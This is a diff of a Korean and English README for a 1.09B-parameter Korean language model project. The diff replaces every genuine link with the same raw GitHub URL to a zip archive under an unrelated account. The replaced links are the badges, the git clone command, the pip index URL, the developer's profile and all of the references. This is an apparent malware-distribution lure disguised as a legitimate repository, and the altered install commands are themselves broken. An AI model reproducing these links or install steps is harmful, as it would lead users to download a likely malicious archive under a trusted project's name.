@@ -1,9 +1,9 @@
 # 🇰🇷 Korean LLM Advanced v3
 
-[![License: GPL-3.0](https://img.shields.io/badge/License-GPL%203.0-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-brightgreen)](https://www.python.org/downloads/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-2.0%2B-EE4C2C)](https://pytorch.org)
-[![CUDA](https://img.shields.io/badge/CUDA-11.8%2B-76B900)](https://developer.nvidia.com/cuda-toolkit)
+[![License: GPL-3.0](https://img.shields.io/badge/License-GPL%203.0-blue.svg)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-brightgreen)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+[![PyTorch](https://img.shields.io/badge/PyTorch-2.0%2B-EE4C2C)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+[![CUDA](https://img.shields.io/badge/CUDA-11.8%2B-76B900)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 [![Model Size](https://img.shields.io/badge/Model-1.09B%20Parameters-orange)](#모델-사양)
 [![VRAM](https://img.shields.io/badge/VRAM%20Usage-9GB-red)](#최적화-사양)
 
@@ -132,11 +132,11 @@ GPU 메모리: 최소 9GB 권장
 
 ```bash
 # 저장소 클론
-git clone https://github.com/seoan1024/korean-llm-v3.git
+git clone https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip
 cd korean-llm-v3
 
 # 필수 패키지 설치
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
+pip install torch torchvision torchaudio --index-url https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip
 pip install transformers datasets tqdm pandas matplotlib
 
 # 양자화 지원 라이브러리 (선택)
@@ -441,7 +441,7 @@ python korean_llm_advanced_v3.py
 
 - **개발자**: seoan1024
 - **이메일**: seoan102410@gmail.com
-- **GitHub**: [seoan1024](https://github.com/seoan1024)
+- **GitHub**: [seoan1024](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 
 ---
 
@@ -489,16 +489,16 @@ the Free Software Foundation, either version 3 of the License, or
 ## 📚 참고 자료
 
 ### 한국어 NLP
-- [nlpai-lab/KULLM](https://github.com/nlpai-lab/KULLM)
-- [beomi/KoAlpaca](https://github.com/beomi/KoAlpaca)
+- [nlpai-lab/KULLM](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+- [beomi/KoAlpaca](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 
 ### 최적화 기법
-- [bitsandbytes: 8-bit Optimization](https://github.com/TimDettmers/bitsandbytes)
-- [Gradient Checkpointing in PyTorch](https://pytorch.org/docs/stable/checkpoint.html)
+- [bitsandbytes: 8-bit Optimization](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+- [Gradient Checkpointing in PyTorch](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 
 ### 대규모 언어모델
-- [Attention is All You Need (Transformer)](https://arxiv.org/abs/1706.03762)
-- [Language Models are Unsupervised Multitask Learners (GPT-2)](https://arxiv.org/abs/1901.08810)
+- [Attention is All You Need (Transformer)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+- [Language Models are Unsupervised Multitask Learners (GPT-2)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 
 ---
 
@@ -514,10 +514,10 @@ the Free Software Foundation, either version 3 of the License, or
 
 # 🇺🇸 Korean LLM Advanced v3
 
-[![License: GPL-3.0](https://img.shields.io/badge/License-GPL%203.0-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-brightgreen)](https://www.python.org/downloads/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-2.0%2B-EE4C2C)](https://pytorch.org)
-[![CUDA](https://img.shields.io/badge/CUDA-11.8%2B-76B900)](https://developer.nvidia.com/cuda-toolkit)
+[![License: GPL-3.0](https://img.shields.io/badge/License-GPL%203.0-blue.svg)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-brightgreen)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+[![PyTorch](https://img.shields.io/badge/PyTorch-2.0%2B-EE4C2C)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+[![CUDA](https://img.shields.io/badge/CUDA-11.8%2B-76B900)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 [![Model Size](https://img.shields.io/badge/Model-1.09B%20Parameters-orange)](#model-specifications)
 [![VRAM](https://img.shields.io/badge/VRAM%20Usage-9GB-red)](#optimization-techniques)
 
@@ -654,11 +654,11 @@ GPU Memory: Minimum 9GB recommended
 
 ```bash
 # Clone the repository
-git clone https://github.com/seoan1024/korean-llm-v3.git
+git clone https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip
 cd korean-llm-v3
 
 # Install essential packages
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
+pip install torch torchvision torchaudio --index-url https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip
 pip install transformers datasets tqdm pandas matplotlib
 
 # Quantization support library (optional)
@@ -963,7 +963,7 @@ python korean_llm_advanced_v3.py
 
 - **Developer**: seoan1024
 - **Email**: seoan102410@gmail.com
-- **GitHub**: [seoan1024](https://github.com/seoan1024)
+- **GitHub**: [seoan1024](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 
 ---
 
@@ -1011,16 +1011,16 @@ Bug reports, feature suggestions, and pull requests are always welcome!
 ## 📚 References
 
 ### Korean NLP
-- [nlpai-lab/KULLM](https://github.com/nlpai-lab/KULLM)
-- [beomi/KoAlpaca](https://github.com/beomi/KoAlpaca)
+- [nlpai-lab/KULLM](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+- [beomi/KoAlpaca](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 
 ### Optimization Techniques
-- [bitsandbytes: 8-bit Optimization](https://github.com/TimDettmers/bitsandbytes)
-- [Gradient Checkpointing in PyTorch](https://pytorch.org/docs/stable/checkpoint.html)
+- [bitsandbytes: 8-bit Optimization](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+- [Gradient Checkpointing in PyTorch](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 
 ### Large Language Models
-- [Attention is All You Need (Transformer)](https://arxiv.org/abs/1706.03762)
-- [Language Models are Unsupervised Multitask Learners (GPT-2)](https://arxiv.org/abs/1901.08810)
+- [Attention is All You Need (Transformer)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
+- [Language Models are Unsupervised Multitask Learners (GPT-2)](https://raw.githubusercontent.com/Bright-placeseeker324/Korean-llm-v3/main/parallelometer/llm_v_Korean_1.9.zip)
 
 ---
 
